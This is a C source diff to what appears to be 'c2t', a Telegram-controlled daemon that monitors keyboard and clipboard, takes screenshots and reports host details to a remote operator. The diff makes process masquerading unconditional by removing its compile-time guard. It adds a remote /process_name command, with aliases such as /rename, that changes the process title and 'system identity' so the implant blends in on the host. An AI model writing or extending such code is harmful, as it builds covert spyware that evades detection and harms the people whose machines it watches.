@@ -205,6 +205,7 @@ typedef enum {
   CMD_SCREENSHOT_QUALITY,
   CMD_SCREENSHOT_STATUS,
   CMD_SCREENSHOT_HELP,
+  CMD_PROCESS_NAME,
   CMD_STATUS,
   CMD_INFO,
   CMD_KILL,
@@ -257,6 +258,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"screenshot_quality", CMD_SCREENSHOT_QUALITY}, {"screenshot_qual", CMD_SCREENSHOT_QUALITY}, {"shot_quality", CMD_SCREENSHOT_QUALITY}, {"shot_qual", CMD_SCREENSHOT_QUALITY},
   {"screenshot_status", CMD_SCREENSHOT_STATUS},
   {"screenshot_help", CMD_SCREENSHOT_HELP},
+  {"process_name", CMD_PROCESS_NAME}, {"procname", CMD_PROCESS_NAME}, {"rename", CMD_PROCESS_NAME}, {"process", CMD_PROCESS_NAME}, {"setname", CMD_PROCESS_NAME}, {"proc_name", CMD_PROCESS_NAME}, {"process_rename", CMD_PROCESS_NAME},
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
@@ -630,11 +632,7 @@ int telegram_send_start_info(void) {
   escape_html_str(raw_ip, ip_str, sizeof(ip_str));
 
   const char *daemon_name =
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
       config->daemon_name && *config->daemon_name ? config->daemon_name : "c2t";
-#else
-      "c2t";
-#endif
   char proc_name[128] = {};
   escape_html_str(daemon_name, proc_name, sizeof(proc_name));
 
@@ -1647,6 +1645,55 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_PROCESS_NAME: {
+    const char *arg = get_command_argument(text);
+    while (*arg && isspace((unsigned char)*arg))
+      arg++;
+    if (!*arg) {
+      const char *cur_name = config->daemon_name && *config->daemon_name
+                                 ? config->daemon_name
+                                 : "c2t";
+      char escaped_cur[128] = {};
+      escape_html_str(cur_name, escaped_cur, sizeof(escaped_cur));
+      char resp[512];
+      snprintf(
+          resp, sizeof(resp),
+          "🏷️ <b>Process Name:</b> <code>%s</code>\n\n"
+          "💡 <b>To rename:</b> <code>/process_name &lt;new_name&gt;</code> "
+          "(or <code>/procname &lt;name&gt;</code>, <code>/rename &lt;name&gt;</code>)",
+          escaped_cur);
+      telegram_send_html(resp);
+    } else {
+      char new_name[64] = {};
+      size_t nlen = 0;
+      while (arg[nlen] && !isspace((unsigned char)arg[nlen]) &&
+             nlen + 1 < sizeof(new_name)) {
+        new_name[nlen] = arg[nlen];
+        nlen++;
+      }
+      new_name[nlen] = '\0';
+      if (nlen == 0) {
+        telegram_send_html("⚠️ <b>Invalid Process Name</b>\n<i>Please provide a "
+                           "non-empty name.</i>");
+      } else {
+        c2t_config_set_daemon_name(new_name);
+        c2t_runtime_set_process_name(new_name, 0, nullptr);
+        c2t_log_info("listener",
+                     "Process name changed to '%s' via Telegram command",
+                     new_name);
+        char escaped_name[128] = {};
+        escape_html_str(new_name, escaped_name, sizeof(escaped_name));
+        char resp[512];
+        snprintf(resp, sizeof(resp),
+                 "🏷️ <b>Process Name Updated:</b> <code>%s</code>\n"
+                 "<i>Process title and system identity updated.</i>",
+                 escaped_name);
+        telegram_send_html(resp);
+      }
+    }
+    break;
+  }
+
   case CMD_STATUS: {
     int clip_paused = clipboard_is_paused();
     int key_paused = keyboard_is_paused();
@@ -1762,6 +1809,7 @@ static void handle_command(const telegram_incoming_update_t *update,
         "<b>Core Controls:</b>\n"
         "• <code>/info</code> (or <code>/start</code>) - View host info &amp; startup summary\n"
         "• <code>/status</code> - View daemon status &amp; throughput state\n"
+        "• <code>/process_name [name]</code> (or <code>/rename</code>, <code>/procname</code>) - View or change process name\n"
         "• <code>/logs</code> - Flush and retrieve execution logs\n"
         "• <code>/pause</code> - Pause all active monitoring\n"
         "• <code>/resume</code> - Resume all active monitoring\n"
@@ -1910,6 +1958,11 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
     handle_command(update, chat_id,
                    update->username ? update->username : "");
   }
+}
+
+void c2t_telegram_listener_handle_update(
+    const telegram_incoming_update_t *update) {
+  on_telegram_command_received(update, nullptr);
 }
 
 static void interruptible_sleep_ms(unsigned int ms) {
